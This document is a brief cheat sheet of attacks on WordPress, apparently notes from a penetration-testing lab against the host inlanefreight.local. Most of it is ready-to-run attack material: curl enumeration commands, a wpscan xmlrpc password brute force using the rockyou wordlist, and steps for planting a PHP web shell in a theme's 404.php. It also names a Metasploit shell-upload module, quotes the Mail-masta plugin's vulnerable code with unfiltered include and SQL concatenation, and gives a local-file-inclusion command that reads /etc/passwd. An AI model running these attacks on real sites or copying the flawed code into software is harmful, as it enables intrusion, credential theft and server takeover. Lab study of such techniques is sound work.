# Enumeration
### Enumerate via /robots.txt(example)
`User-agent: *`
`Disallow: /wp-admin/`
`Allow: /wp-admin/admin-ajax.php`
`Disallow: /wp-content/uploads/wpforms/`
`Sitemap: https://inlanefreight.local/wp-sitemap.xml`

### Enumerate WP version	
`curl -s http://blog.inlanefreight.local | grep WordPress`

### Enumerate Plugins
`curl -s http://blog.inlanefreight.local/ | grep plugins`

### Enumerate Themes
`curl -s http://blog.inlanefreight.local/ | grep themes`


# Attacks
### Login bruteforce
`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

### Web-shell inject (Authenticated)
1. Appearance -- Theme Editor -- Choose theme
2. Find the 404.php
3. Inject your PHP web-shell.
4. Call the shell: `/wp-content/themes/<theme name>/404.php?cmd=XXXX`
OR
`use exploit/unix/webapp/wp_admin_shell_upload` in MSF

### wpDiscuz exploit
You could maybe use this: https://www.exploit-db.com/exploits/49967

### Mail-masta exploit (SQLi to LFI BUG)
The code is bugged:
`<?php` 
`include($_GET['pl']);`
`global $wpdb;`
`$camp_id=$_POST['camp_id'];`
`$masta_reports = $wpdb->prefix . "masta_reports";`
`$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");`
`echo $count[0]->co;`
`?>`

The pl gets used without any filtering, so you can exploit it:
`curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`